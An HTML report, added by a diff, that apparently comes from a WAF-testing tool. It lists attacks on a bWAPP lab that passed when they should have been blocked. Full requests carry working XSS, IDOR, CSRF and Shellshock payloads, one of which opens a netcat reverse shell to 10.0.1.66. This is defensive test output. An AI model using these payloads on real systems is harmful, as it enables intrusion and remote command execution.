+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A3_08</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A3_08</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>XSS - Reflected (HREF)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A3.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/xss_href-2.php?name=test+onmouseover%3Dalert(0)+z%3D&amp;action=vote</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>test onmouseover=alert(0) z=</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/xss_href-2.php?name=test+onmouseover%3Dalert(0)+z%3D&amp;action=vote HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A3_09</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A3_09</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>XSS - Reflected (PHP_SELF)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A3.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/xss_php_self.php/&#34;&gt;&lt;script&gt;alert(0);&lt;/script&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&#34;&gt;&lt;script&gt;alert(0);&lt;/script&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/xss_php_self.php/%22%3E%3Cscript%3Ealert(0);%3C/script%3E HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A3_11</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A3_11</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>XSS - Reflected (JSON)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A3.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/xss_json.php?title=&#39;%3Balert(0)%3B%2F%2F&amp;action=search</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&#39;;alert(0);//</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/xss_json.php?title=&#39;%3Balert(0)%3B%2F%2F&amp;action=search HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A4_01</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A4_01</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>Insecure DOR (Order Tickets)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A4.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/insecure_direct_object_ref_2.php</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>ticket_price=1</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>POST /bWAPP/insecure_direct_object_ref_2.php HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Content-Length: 197
+Connection: keep-alive
+
+ticket_quantity=1&amp;ticket_price=1&amp;action=order&amp;__formtoken=MDAwMDAwMDEwMDAwMDAwQ3RpY2tldF9wcmljZTAwMDAwMDAwNTcyMzNjZjQyZDk0NjMzZmU0ZjQ3OWNhNjc1ODZiYWYxOTAzMWVmNjkyYTU2NTllYTA2ZGRmMmI5YjM5YzliNQ%3D%3</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A4_01</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A4_01</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>Insecure DOR (Order Tickets)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A4.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/insecure_direct_object_ref_2.php</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>ticket_price=1</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>POST /bWAPP/insecure_direct_object_ref_2.php HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Content-Length: 197
+Connection: keep-alive
+
+ticket_quantity=1&amp;ticket_price=1&amp;action=order&amp;__formtoken=MDAwMDAwMDEwMDAwMDAwQ3RpY2tldF9wcmljZTAwMDAwMDAwNTcyMzNjZjQyZDk0NjMzZmU0ZjQ3OWNhNjc1ODZiYWYxOTAzMWVmNjkyYTU2NTllYTA2ZGRmMmI5YjM5YzliNQ%3D%3</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A5_02</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A5_02</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>Directory listing</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A5.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/evil/</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>/evil/</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /evil/ HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A5_02</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A5_02</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>Directory listing</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A6.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/evil/</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>/evil/</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /evil/ HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A8_01</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A8_01</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>CSRF attack</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A8.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/portal.php</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre></pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>POST /bWAPP/portal.php HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Content-Length: 9
+Connection: keep-alive
+
+test=test</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A8_01</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A8_01</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>CSRF attack</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A8.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/portal.php</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre></pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>POST /bWAPP/portal.php HTTP/1.1
+Host: 172.16.9.69:80
+Content-Type: application/x-www-form-urlencoded
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Content-Length: 9
+Connection: keep-alive
+
+test=test</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A8_01</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A8_01</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>CSRF attack</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A8.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/csrf_3.php</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre></pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>POST /bWAPP/csrf_3.php HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Content-Length: 38
+Connection: keep-alive
+
+secret=awesome&amp;login=bee&amp;action=change</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+
+
+
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A9_03</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A9_03</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>Shellshock</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A9.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/cgi-bin/shellshock.sh</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>() { :;}; echo &#34;bWAPP:&#34; $(/bin/sh -c &#34;expr 1 + 2&#34;)</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/cgi-bin/shellshock.sh HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A9_04</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A9_04</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>Shellshock</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A9.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/cgi-bin/shellshock.sh</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>() { :;}; echo &#34;bWAPP:&#34; $(/bin/sh -c &#34;nc 10.0.1.66 666 -e /bin/bash&#34;)</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/cgi-bin/shellshock.sh HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+
+      </div>
+
+
+      </div>
+  </BODY>
+</HTML>
